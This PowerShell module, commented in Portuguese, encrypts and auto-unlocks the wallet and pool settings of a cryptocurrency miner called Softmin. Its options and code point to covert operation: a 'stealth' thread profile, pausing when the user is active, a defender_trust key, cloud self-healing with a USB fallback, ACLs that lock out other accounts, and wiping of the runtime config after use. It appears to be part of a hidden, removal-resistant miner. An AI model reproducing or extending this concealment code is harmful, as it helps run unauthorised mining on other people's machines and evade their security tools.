# Cofre cifrado Softmin: AES-256 + PBKDF2 (600k) + HMAC + envelope DPAPI (autostart).
. "$PSScriptRoot\Softmin-Common.ps1"
Add-Type -AssemblyName System.Security

$script:SoftminVaultSchema = 'softmin-vault/v1'
$script:SoftminKdfIterations = 600000

function Expand-SoftminInstallPathEnv {
    param([string]$Path)
    if ([string]::IsNullOrWhiteSpace($Path)) { return $Path }
    return [Environment]::ExpandEnvironmentVariables($Path.Trim())
}

function Get-SoftminVaultPaths {
    param([string]$InstallPath)
    $InstallPath = $InstallPath.TrimEnd('\')
    return [pscustomobject]@{
        Vault      = Join-Path $InstallPath 'settings.vault'
        Meta       = Join-Path $InstallPath 'softmin.meta.ini'
        KeyDpapi   = Join-Path $InstallPath 'settings.key.dpapi'
        CredsDpapi = Join-Path $InstallPath 'settings.creds.dpapi'
    }
}

function Test-SoftminSecureVault {
    param([string]$InstallPath)
    $p = Get-SoftminVaultPaths -InstallPath $InstallPath
    return (Test-Path -LiteralPath $p.Vault)
}

function Get-SoftminSensitiveKeys {
    return @('wallet_address', 'pool_url', 'pool_port', 'tls', 'coin', 'algo', 'worker_prefix')
}

function Get-SoftminMetaKeys {
    return @(
        'cpu_mode', 'cpu_profile', 'auto_pool', 'install_path', 'autostart', 'pause_on_active',
        'google_dns', 'adaptive_ramp_minutes', 'adaptive_night_ramp_minutes', 'night_start', 'night_end',
        'adaptive_brake', 'adaptive_check_seconds', 'start_on_install',
        'cloud_heal_enabled', 'cloud_manifest_url', 'cloud_base_url', 'cloud_usb_fallback',
        'secure_vault', 'secure_autostart', 'defender_trust'
    )
}

function ConvertFrom-SoftminSettingsMap {
    param([hashtable]$Map)
    $pp = 443
    if ($Map.ContainsKey('pool_port') -and "$($Map['pool_port'])" -ne '') { $pp = [int]$Map['pool_port'] }
    return [pscustomobject]@{
        wallet_address = [string]$Map['wallet_address']
        pool_url       = [string]$Map['pool_url']
        pool_port      = $pp
        worker_prefix  = $(if ($Map['worker_prefix']) { [string]$Map['worker_prefix'] } else { 'OMICRON' })
        cpu_profile    = $(if ($Map['cpu_profile']) { [string]$Map['cpu_profile'] } else { 'eco' })
        cpu_mode       = $(if ($Map['cpu_mode']) { [string]$Map['cpu_mode'] } else { 'fixed' })
        auto_pool      = (($Map['auto_pool'] -eq 'true'))
        install_path   = (Resolve-SoftminInstallPath (Expand-SoftminInstallPathEnv $(if ($Map['install_path']) { [string]$Map['install_path'] } else { "$env:LOCALAPPDATA\Softmin" })))
        autostart      = $(if ($Map.ContainsKey('autostart')) { ($Map['autostart'] -ne 'false') } else { $true })
        pause_on_active = $(if ($Map.ContainsKey('pause_on_active')) { ($Map['pause_on_active'] -ne 'false') } else { $true })
        tls            = (($Map['tls'] -eq 'true'))
        coin           = $Map['coin']
        algo           = $Map['algo']
        google_dns     = (($Map['google_dns'] -eq 'true'))
        secure_vault   = (($Map['secure_vault'] -ne 'false'))
        secure_autostart = (($Map['secure_autostart'] -eq 'true'))
    }
}

function Read-SoftminIniMap {
    param([string]$Path)
    $map = @{}
    if (-not (Test-Path -LiteralPath $Path)) { return $map }
    Get-Content -LiteralPath $Path -Encoding UTF8 | ForEach-Object {
        $line = $_.Trim()
        if ($line -eq '' -or $line.StartsWith('#')) { return }
        $eq = $line.IndexOf('=')
        if ($eq -lt 1) { return }
        $map[$line.Substring(0, $eq).Trim()] = $line.Substring($eq + 1).Trim()
    }
    return $map
}

function Write-SoftminIniMap {
    param(
        [string]$Path,
        [hashtable]$Map,
        [string]$Header = ''
    )
    $lines = [System.Collections.Generic.List[string]]::new()
    if ($Header) { [void]$lines.Add($Header) }
    foreach ($k in ($Map.Keys | Sort-Object)) {
        if ($null -ne $Map[$k] -and "$($Map[$k])" -ne '') {
            [void]$lines.Add(('{0}={1}' -f $k, $Map[$k]))
        }
    }
    Set-Content -LiteralPath $Path -Value ($lines -join "`r`n") -Encoding UTF8
}

function ConvertTo-SoftminSettingsMapFromObject {
    param([object]$Settings)
    $map = @{}
    foreach ($p in $Settings.PSObject.Properties) {
        $v = $p.Value
        if ($null -eq $v) { continue }
        if ($v -is [bool]) { $map[$p.Name] = $v.ToString().ToLower() }
        else { $map[$p.Name] = [string]$v }
    }
    return $map
}

function Merge-SoftminSettingsMaps {
    param([hashtable]$Sensitive, [hashtable]$Meta)
    $all = @{}
    foreach ($k in $Meta.Keys) { $all[$k] = $Meta[$k] }
    foreach ($k in $Sensitive.Keys) { $all[$k] = $Sensitive[$k] }
    return ConvertFrom-SoftminSettingsMap -Map $all
}

function Get-SoftminMetaSettings {
    param([string]$InstallPath)
    $paths = Get-SoftminVaultPaths -InstallPath $InstallPath
    if (Test-Path -LiteralPath $paths.Meta) {
        return Read-SoftminIniMap -Path $paths.Meta
    }
    $ini = Join-Path $InstallPath 'settings.ini'
    if (Test-Path -LiteralPath $ini) {
        $full = Read-SoftminIniMap -Path $ini
        $meta = @{}
        foreach ($k in (Get-SoftminMetaKeys)) {
            if ($full.ContainsKey($k)) { $meta[$k] = $full[$k] }
        }
        return $meta
    }
    return @{}
}

function Test-SoftminBytesEqual {
    param([byte[]]$A, [byte[]]$B)
    if ($null -eq $A -or $null -eq $B -or $A.Length -ne $B.Length) { return $false }
    $diff = 0
    for ($i = 0; $i -lt $A.Length; $i++) { $diff = $diff -bor ($A[$i] -bxor $B[$i]) }
    return ($diff -eq 0)
}

function New-SoftminRandomBytes {
    param([int]$Length)
    $b = New-Object byte[] $Length
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $rng.GetBytes($b)
    $rng.Dispose()
    return $b
}

function Get-SoftminPbkdf2Key {
    param(
        [string]$Password,
        [string]$Codigo,
        [byte[]]$Salt,
        [int]$Iterations = $script:SoftminKdfIterations
    )
    $passBytes = [Text.Encoding]::UTF8.GetBytes($Password + [char]0 + $(if ($Codigo) { $Codigo } else { '' }))
    $derive = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
        $passBytes, $Salt, $Iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
    try {
        return $derive.GetBytes(32)
    } finally {
        $derive.Dispose()
    }
}

function Invoke-SoftminAesEncrypt {
    param([byte[]]$Plain, [byte[]]$Key, [byte[]]$Iv)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $Key
    $aes.IV = $Iv
    $enc = $aes.CreateEncryptor()
    try {
        return $enc.TransformFinalBlock($Plain, 0, $Plain.Length)
    } finally {
        $aes.Dispose()
    }
}

function Invoke-SoftminAesDecrypt {
    param([byte[]]$Cipher, [byte[]]$Key, [byte[]]$Iv)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $Key
    $aes.IV = $Iv
    $dec = $aes.CreateDecryptor()
    try {
        return $dec.TransformFinalBlock($Cipher, 0, $Cipher.Length)
    } finally {
        $aes.Dispose()
    }
}

function Get-SoftminHmac {
    param([byte[]]$Key, [byte[]]$Data)
    $h = New-Object System.Security.Cryptography.HMACSHA256 (,$Key)
    try {
        return $h.ComputeHash($Data)
    } finally {
        $h.Dispose()
    }
}

function Protect-SoftminBytesWithDpapi {
    param([byte[]]$Data)
    $entropy = [Text.Encoding]::UTF8.GetBytes('Softmin-Vault-v1')
    return [System.Security.Cryptography.ProtectedData]::Protect(
        $Data, $entropy, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
}

function Unprotect-SoftminBytesWithDpapi {
    param([byte[]]$Data)
    $entropy = [Text.Encoding]::UTF8.GetBytes('Softmin-Vault-v1')
    return [System.Security.Cryptography.ProtectedData]::Unprotect(
        $Data, $entropy, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
}

function Split-SoftminSettingsForVault {
    param([object]$Settings)
    $full = ConvertTo-SoftminSettingsMapFromObject -Settings $Settings
    $sensitive = @{}
    $meta = @{}
    foreach ($k in $full.Keys) {
        if ((Get-SoftminSensitiveKeys) -contains $k) { $sensitive[$k] = $full[$k] }
        elseif ((Get-SoftminMetaKeys) -contains $k) { $meta[$k] = $full[$k] }
    }
    if (-not $meta.ContainsKey('secure_vault')) { $meta['secure_vault'] = 'true' }
    return @{ Sensitive = $sensitive; Meta = $meta }
}

function Save-SoftminSecureVault {
    param(
        [string]$InstallPath,
        [object]$Settings,
        [Parameter(Mandatory = $true)]
        [string]$Password,
        [string]$Codigo = '',
        [switch]$EnableAutostartUnlock
    )

    $InstallPath = $InstallPath.TrimEnd('\')
    $paths = Get-SoftminVaultPaths -InstallPath $InstallPath
    $split = Split-SoftminSettingsForVault -Settings $Settings

    $payloadJson = ($split.Sensitive | ConvertTo-Json -Compress)
    $plain = [Text.Encoding]::UTF8.GetBytes($payloadJson)
    $dek = New-SoftminRandomBytes 32
    $iv = New-SoftminRandomBytes 16
    $cipher = Invoke-SoftminAesEncrypt -Plain $plain -Key $dek -Iv $iv
    $macKey = New-SoftminRandomBytes 32
    $macData = New-Object byte[] ($iv.Length + $cipher.Length)
    [Array]::Copy($iv, 0, $macData, 0, $iv.Length)
    [Array]::Copy($cipher, 0, $macData, $iv.Length, $cipher.Length)
    $hmac = Get-SoftminHmac -Key $macKey -Data $macData

    $salt = New-SoftminRandomBytes 32
    $kek = Get-SoftminPbkdf2Key -Password $Password -Codigo $Codigo -Salt $salt
    $wrapIv = New-SoftminRandomBytes 16
    $wrappedKeyMaterial = New-Object byte[] ($dek.Length + $macKey.Length)
    [Array]::Copy($dek, 0, $wrappedKeyMaterial, 0, $dek.Length)
    [Array]::Copy($macKey, 0, $wrappedKeyMaterial, $dek.Length, $macKey.Length)
    $keywrapPwd = Invoke-SoftminAesEncrypt -Plain $wrappedKeyMaterial -Key $kek -Iv $wrapIv

    $vault = [ordered]@{
        schema     = $script:SoftminVaultSchema
        created    = (Get-Date).ToUniversalTime().ToString('o')
        iterations = $script:SoftminKdfIterations
        salt       = [Convert]::ToBase64String($salt)
        iv         = [Convert]::ToBase64String($iv)
        ciphertext = [Convert]::ToBase64String($cipher)
        hmac       = [Convert]::ToBase64String($hmac)
        keywrap_iv = [Convert]::ToBase64String($wrapIv)
        keywrap    = [Convert]::ToBase64String($keywrapPwd)
    }

    Save-JsonUtf8NoBom -Object $vault -Path $paths.Vault
    Write-SoftminIniMap -Path $paths.Meta -Map $split.Meta -Header '# Softmin meta (sem carteira/pool - dados sensiveis em settings.vault)'

    if ($EnableAutostartUnlock) {
        $dpapiBlob = Protect-SoftminBytesWithDpapi -Data $wrappedKeyMaterial
        [System.IO.File]::WriteAllBytes($paths.KeyDpapi, $dpapiBlob)
        Save-SoftminVaultCredentials -InstallPath $InstallPath -Password $Password -Codigo $Codigo
    } elseif (Test-Path -LiteralPath $paths.KeyDpapi) {
        Remove-Item -LiteralPath $paths.KeyDpapi -Force
    }

    Set-SoftminSecureFileAcl -Path $paths.Vault
    Set-SoftminSecureFileAcl -Path $paths.Meta
    if (Test-Path -LiteralPath $paths.KeyDpapi) { Set-SoftminSecureFileAcl -Path $paths.KeyDpapi }

    foreach ($plainFile in @('settings.ini', 'settings.json', 'softmin-wallet.ini')) {
        $fp = Join-Path $InstallPath $plainFile
        if (Test-Path -LiteralPath $fp) { Remove-Item -LiteralPath $fp -Force -ErrorAction SilentlyContinue }
    }

    return $paths
}

function Save-SoftminVaultCredentials {
    param(
        [string]$InstallPath,
        [string]$Password,
        [string]$Codigo = ''
    )
    $paths = Get-SoftminVaultPaths -InstallPath $InstallPath
    $json = (@{ password = $Password; codigo = $Codigo } | ConvertTo-Json -Compress)
    $blob = Protect-SoftminBytesWithDpapi -Data ([Text.Encoding]::UTF8.GetBytes($json))
    [System.IO.File]::WriteAllBytes($paths.CredsDpapi, $blob)
    Set-SoftminSecureFileAcl -Path $paths.CredsDpapi
}

function Get-SoftminVaultCredentials {
    param([string]$InstallPath)
    $paths = Get-SoftminVaultPaths -InstallPath $InstallPath
    if (-not (Test-Path -LiteralPath $paths.CredsDpapi)) { return $null }
    try {
        $plain = Unprotect-SoftminBytesWithDpapi -Data ([System.IO.File]::ReadAllBytes($paths.CredsDpapi))
        $obj = [Text.Encoding]::UTF8.GetString($plain) | ConvertFrom-Json
        return @{ Password = [string]$obj.password; Codigo = [string]$obj.codigo }
    } catch { return $null }
}

function Repair-SoftminVaultAutostart {
    param([string]$InstallPath)
    $InstallPath = $InstallPath.TrimEnd('\')
    $paths = Get-SoftminVaultPaths -InstallPath $InstallPath
    if (-not (Test-Path -LiteralPath $paths.Vault)) { return $false }
    $creds = Get-SoftminVaultCredentials -InstallPath $InstallPath
    if (-not $creds) { return $false }
    try {
        $sensitive = Unlock-SoftminVaultKeys -InstallPath $InstallPath -Password $creds.Password -Codigo $creds.Codigo
        if (-not $sensitive) { return $false }
        $vault = Get-Content -LiteralPath $paths.Vault -Raw -Encoding UTF8 | ConvertFrom-Json
        $salt = [Convert]::FromBase64String([string]$vault.salt)
        $kek = Get-SoftminPbkdf2Key -Password $creds.Password -Codigo $creds.Codigo -Salt $salt -Iterations ([int]$vault.iterations)
        $wrapIv = [Convert]::FromBase64String([string]$vault.keywrap_iv)
        $keywrap = [Convert]::FromBase64String([string]$vault.keywrap)
        $wrappedKeyMaterial = Invoke-SoftminAesDecrypt -Cipher $keywrap -Key $kek -Iv $wrapIv
        $dpapiBlob = Protect-SoftminBytesWithDpapi -Data $wrappedKeyMaterial
        [System.IO.File]::WriteAllBytes($paths.KeyDpapi, $dpapiBlob)
        Set-SoftminSecureFileAcl -Path $paths.KeyDpapi
        return $true
    } catch { return $false }
}

function Unlock-SoftminVaultKeys {
    param(
        [string]$InstallPath,
        [string]$Password = '',
        [string]$Codigo = '',
        [switch]$TryDpapi
    )

    $paths = Get-SoftminVaultPaths -InstallPath $InstallPath
    if (-not (Test-Path -LiteralPath $paths.Vault)) {
        throw 'settings.vault nao encontrado.'
    }
    $vault = Get-Content -LiteralPath $paths.Vault -Raw -Encoding UTF8 | ConvertFrom-Json

    $wrappedKeyMaterial = $null
    if ($TryDpapi -and (Test-Path -LiteralPath $paths.KeyDpapi)) {
        try {
            $wrappedKeyMaterial = Unprotect-SoftminBytesWithDpapi -Data ([System.IO.File]::ReadAllBytes($paths.KeyDpapi))
        } catch { }
    }

    if (-not $wrappedKeyMaterial) {
        $creds = Get-SoftminVaultCredentials -InstallPath $InstallPath
        if ($creds) {
            $Password = $creds.Password
            $Codigo = $creds.Codigo
        }
    }

    if (-not $wrappedKeyMaterial) {
        if (-not $Password) { return $null }
        $salt = [Convert]::FromBase64String([string]$vault.salt)
        $kek = Get-SoftminPbkdf2Key -Password $Password -Codigo $Codigo -Salt $salt -Iterations ([int]$vault.iterations)
        $wrapIv = [Convert]::FromBase64String([string]$vault.keywrap_iv)
        $keywrap = [Convert]::FromBase64String([string]$vault.keywrap)
        $wrappedKeyMaterial = Invoke-SoftminAesDecrypt -Cipher $keywrap -Key $kek -Iv $wrapIv
    }

    $dek = New-Object byte[] 32
    $macKey = New-Object byte[] 32
    [Array]::Copy($wrappedKeyMaterial, 0, $dek, 0, 32)
    [Array]::Copy($wrappedKeyMaterial, 32, $macKey, 0, 32)

    $iv = [Convert]::FromBase64String([string]$vault.iv)
    $cipher = [Convert]::FromBase64String([string]$vault.ciphertext)
    $macData = New-Object byte[] ($iv.Length + $cipher.Length)
    [Array]::Copy($iv, 0, $macData, 0, $iv.Length)
    [Array]::Copy($cipher, 0, $macData, $iv.Length, $cipher.Length)
    $expected = [Convert]::FromBase64String([string]$vault.hmac)
    $actual = Get-SoftminHmac -Key $macKey -Data $macData
    if (-not (Test-SoftminBytesEqual -A $actual -B $expected)) {
        throw 'Cofre invalido ou palavra-passe/codigo incorrectos.'
    }

    $plain = Invoke-SoftminAesDecrypt -Cipher $cipher -Key $dek -Iv $iv
    $json = [Text.Encoding]::UTF8.GetString($plain)
    $obj = $json | ConvertFrom-Json
    $map = @{}
    foreach ($p in $obj.PSObject.Properties) { $map[$p.Name] = [string]$p.Value }
    return $map
}

function Unlock-SoftminSettings {
    param(
        [string]$InstallPath,
        [string]$Password = '',
        [string]$Codigo = '',
        [switch]$TryDpapi,
        [switch]$PromptIfNeeded
    )

    $InstallPath = $InstallPath.TrimEnd('\')
    if (-not (Test-SoftminSecureVault -InstallPath $InstallPath)) {
        return Get-SoftminSettings -SourceRoot $InstallPath
    }

    $meta = Get-SoftminMetaSettings -InstallPath $InstallPath
    $metaObj = Get-SoftminVaultPaths -InstallPath $InstallPath
    $tryAuto = $TryDpapi -or (($meta['secure_autostart'] -eq 'true') -and (Test-Path -LiteralPath $metaObj.KeyDpapi))

    $sensitive = Unlock-SoftminVaultKeys -InstallPath $InstallPath -Password $Password -Codigo $Codigo -TryDpapi:$tryAuto
    if (-not $sensitive -and $PromptIfNeeded) {
        Write-Host ''
        Write-Host 'Cofre Softmin — introduza a palavra-passe (dados cifrados).' -ForegroundColor Cyan
        $sec = Read-Host 'Palavra-passe' -AsSecureString
        $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($sec)
        try { $Password = [Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr) }
        finally { [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr) }
        $Codigo = Read-Host 'Codigo extra (Enter se nao definido)'
        $sensitive = Unlock-SoftminVaultKeys -InstallPath $InstallPath -Password $Password -Codigo $Codigo
    }
    if (-not $sensitive) {
        throw 'Nao foi possivel desbloquear settings.vault.'
    }
    return Merge-SoftminSettingsMaps -Sensitive $sensitive -Meta $meta
}

function Read-SoftminAdaptiveMeta {
    param([string]$InstallPath)
    $meta = Get-SoftminMetaSettings -InstallPath $InstallPath
    return @{
        cpu_mode                          = $(if ($meta['cpu_mode']) { $meta['cpu_mode'] } else { 'adaptive' })
        adaptive_check_seconds            = $(if ($meta['adaptive_check_seconds']) { [int]$meta['adaptive_check_seconds'] } else { 5 })
        adaptive_active_threshold_seconds = $(if ($meta['adaptive_active_threshold_seconds']) { [int]$meta['adaptive_active_threshold_seconds'] } else { 5 })
        adaptive_resume_seconds           = $(if ($meta['adaptive_resume_seconds']) { [int]$meta['adaptive_resume_seconds'] } else { 60 })
        adaptive_brake                    = $(if ($meta['adaptive_brake']) { $meta['adaptive_brake'] } else { 'pause' })
        night_start                       = $(if ($meta['night_start']) { $meta['night_start'] } else { '00:00' })
        night_end                         = $(if ($meta['night_end']) { $meta['night_end'] } else { '07:00' })
        adaptive_ramp_minutes             = $(if ($meta['adaptive_ramp_minutes']) { $meta['adaptive_ramp_minutes'] -split ',' | ForEach-Object { [int]$_.Trim() } } else { @(10, 25, 45) })
        adaptive_night_ramp_minutes       = $(if ($meta['adaptive_night_ramp_minutes']) { [int]$meta['adaptive_night_ramp_minutes'] } else { 15 })
    }
}

function Set-SoftminSecureFileAcl {
    param([string]$Path)
    if (-not (Test-Path -LiteralPath $Path)) { return }
    try {
        $acl = New-Object System.Security.AccessControl.FileSecurity
        $acl.SetAccessRuleProtection($true, $false)
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
            $user, 'FullControl', 'Allow')
        $acl.AddAccessRule($rule)
        $sysRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
            'NT AUTHORITY\SYSTEM', 'FullControl', 'Allow')
        $acl.AddAccessRule($sysRule)
        Set-Acl -LiteralPath $Path -AclObject $acl
    } catch { }
}

function Set-SoftminSecureFolderAcl {
    param([string]$InstallPath)
    $InstallPath = $InstallPath.TrimEnd('\')
    if (-not (Test-Path -LiteralPath $InstallPath)) { return }
    try {
        $acl = Get-Acl -LiteralPath $InstallPath
        $acl.SetAccessRuleProtection($true, $false)
        $acl.Access | ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
                $user, 'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow')))
        $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
                'NT AUTHORITY\SYSTEM', 'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow')))
        Set-Acl -LiteralPath $InstallPath -AclObject $acl
    } catch { }
}

function Write-SoftminRuntimeConfig {
    param(
        [string]$InstallPath,
        [object]$Settings
    )
    $InstallPath = $InstallPath.TrimEnd('\')
    $template = Join-Path $InstallPath 'config.template.json'
    if (-not (Test-Path -LiteralPath $template)) {
        throw 'config.template.json nao encontrado.'
    }
    $hostname = $env:COMPUTERNAME
    $workerName = "$($Settings.worker_prefix)-$(Sanitize-WorkerToken $hostname)"
    $hint = if ($Settings.cpu_mode -eq 'adaptive') { Get-MaxThreadsHint 'stealth' } else { Get-MaxThreadsHint $Settings.cpu_profile }
    $rxMode = if ($Settings.cpu_mode -eq 'adaptive') { 'light' } else { Get-SoftminRandomxModeForProfile $Settings.cpu_profile }
    $cfg = Build-SoftminConfig -TemplatePath $template -Wallet $Settings.wallet_address -PoolHost $Settings.pool_url `
        -PoolPort $Settings.pool_port -WorkerName $workerName -MaxThreadsHint $hint `
        -PauseOnActive $Settings.pause_on_active -Tls $Settings.tls -Coin $Settings.coin -Algo $Settings.algo `
        -RandomxMode $rxMode -PauseOnActiveSec $(if ($Settings.pause_on_active) { 3 } else { 0 })
    $configPath = Join-Path $InstallPath 'config.json'
    Save-JsonUtf8NoBom -Object $cfg -Path $configPath
    Set-SoftminSecureFileAcl -Path $configPath
    return $configPath
}

function Clear-SoftminRuntimeSecrets {
    param([string]$InstallPath)
    $configPath = Join-Path $InstallPath.TrimEnd('\') 'config.json'
    if (Test-Path -LiteralPath $configPath) {
        try {
            $bytes = New-SoftminRandomBytes 4096
            [System.IO.File]::WriteAllBytes($configPath, $bytes)
        } catch { }
        Remove-Item -LiteralPath $configPath -Force -ErrorAction SilentlyContinue
    }
}

function Initialize-SoftminSecureVaultAtInstall {
    param(
        [string]$InstallPath,
        [object]$Settings,
        [SecureString]$VaultPassword = $null,
        [string]$VaultCodigo = '',
        [switch]$NonInteractive
    )

    $InstallPath = $InstallPath.TrimEnd('\')
    $enableAuto = $true
    if ($Settings.PSObject.Properties.Name -contains 'secure_autostart') {
        $enableAuto = [bool]$Settings.secure_autostart
    }

    $pwdPlain = $null
    if ($VaultPassword) {
        $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($VaultPassword)
        try { $pwdPlain = [Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr) }
        finally { [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr) }
    } elseif (-not $NonInteractive) {
        Write-Host ''
        Write-Host '=== Cofre Softmin (AES-256 + PBKDF2 600k) ===' -ForegroundColor Cyan
        Write-Host 'Carteira e pool serao cifrados. Guarde a palavra-passe e codigo extra.' -ForegroundColor Yellow
        $sec1 = Read-Host 'Palavra-passe do cofre' -AsSecureString
        $sec2 = Read-Host 'Confirmar palavra-passe' -AsSecureString
        $b1 = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($sec1)
        $b2 = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($sec2)
        try {
            $p1 = [Runtime.InteropServices.Marshal]::PtrToStringAuto($b1)
            $p2 = [Runtime.InteropServices.Marshal]::PtrToStringAuto($b2)
        } finally {
            [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($b1)
            [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($b2)
        }
        if ($p1 -ne $p2) { throw 'Palavras-passe nao coincidem.' }
        if ($p1.Length -lt 8) { throw 'Use pelo menos 8 caracteres na palavra-passe.' }
        $pwdPlain = $p1
        $VaultCodigo = Read-Host 'Codigo extra (segundo factor, Enter para omitir)'
        $autoAns = Read-Host 'Desbloqueio automatico neste PC apos reinicio? (S/N) [S]'
        if ($autoAns -match '^[nN]') { $enableAuto = $false }
    } else {
        throw 'secure_vault=true requer palavra-passe (modo interactivo) ou -VaultPassword.'
    }

    Save-SoftminSecureVault -InstallPath $InstallPath -Settings $Settings -Password $pwdPlain `
        -Codigo $VaultCodigo -EnableAutostartUnlock:$enableAuto | Out-Null
    $vaultPaths = Get-SoftminVaultPaths -InstallPath $InstallPath
    foreach ($vaultFile in @($vaultPaths.Vault, $vaultPaths.KeyDpapi, $vaultPaths.CredsDpapi)) {
        if (Test-Path -LiteralPath $vaultFile) {
            Set-SoftminSecureFileAcl -Path $vaultFile
        }
    }
    Write-SoftminInstallStep $InstallPath 'VAULT' 'Cofre cifrado gravado (settings.vault). Ficheiros em texto claro removidos.' -Status 'OK'
}

function Ensure-SoftminLocalVaultCredentials {
    param([string]$InstallPath)
    $paths = Get-SoftminVaultPaths -InstallPath $InstallPath
    if (Test-Path -LiteralPath $paths.CredsDpapi) { return $true }
    $auto = Join-Path $InstallPath 'Softmin-AutoUnlock.ps1'
    if (-not (Test-Path -LiteralPath $auto)) { return $false }
    . $auto
    if (-not (Get-Command Get-SoftminAutoVaultCredentials -ErrorAction SilentlyContinue)) { return $false }
    $c = Get-SoftminAutoVaultCredentials
    if (-not $c.Password) { return $false }
    Save-SoftminVaultCredentials -InstallPath $InstallPath -Password $c.Password -Codigo $(if ($c.Codigo) { $c.Codigo } else { '' })
    Repair-SoftminVaultAutostart -InstallPath $InstallPath | Out-Null
    return $true
}

function Request-SoftminVaultPassword {
    param([string]$Reason = 'Desbloquear cofre Softmin')
    Write-Host $Reason -ForegroundColor Cyan
    $sec = Read-Host 'Palavra-passe' -AsSecureString
    $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($sec)
    try {
        return @{
            Password = [Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
            Codigo   = (Read-Host 'Codigo extra (Enter se nao definido)')
        }
    } finally {
        [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
    }
}
